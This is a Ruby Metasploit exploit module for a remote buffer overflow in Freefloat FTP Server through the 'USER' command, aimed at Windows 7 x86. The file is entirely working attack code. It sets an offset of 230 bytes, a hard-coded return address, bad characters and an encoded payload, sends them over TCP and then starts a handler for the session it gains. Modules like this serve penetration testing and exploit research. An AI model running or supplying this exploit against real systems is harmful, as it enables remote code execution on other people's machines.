require 'msf/core'
	class MetasploitModule < Msf::Exploit::Remote
	Rank = NormalRanking
	include Exploit::Remote::Tcp
	
	def initialize(info={})
		super(
			update_info(
			info,
			"Name" => "Freefloat FTP Server - 'USER' Remote Buffer Overflow",
			"License" => MSF_LICENSE,
			'Privileged'	 => false,
			"Author" => "Ngovinhhuy",
			'Arch'		=> ARCH_X86,
			'Platform'	=> 'windows',
			"Date"	=> "10-10-2021",
			"Description" => "Exploit version 1.0 on Windows 7 32bit",
			"References" => [
						['EDB', '23243'],
						['URL' , 'https://www.exploit-db.com/exploits/23243'],
					],
			"Payload" => {
				"Space" => 400,
				"BadChars" => "\x00\x0a\x0d",
			},
			"Targets" => 
			[
				[
					"Windows 7 x86",
					{
						"Ret"=>0x7750595B,
					}
				]
			],
			'DefaultTarget'  => 0
			)
		)
	end
	
	def exploit
		connect
		print_status("Exploiting......")
		buf="USER "
		offset=230
		buf<< "A"*offset
		buf<< [target.ret].pack('V')
		buf<< payload.encoded
		buf<< "\r\n"
		sock.put(buf)
		handler
		disconnect
	end
end
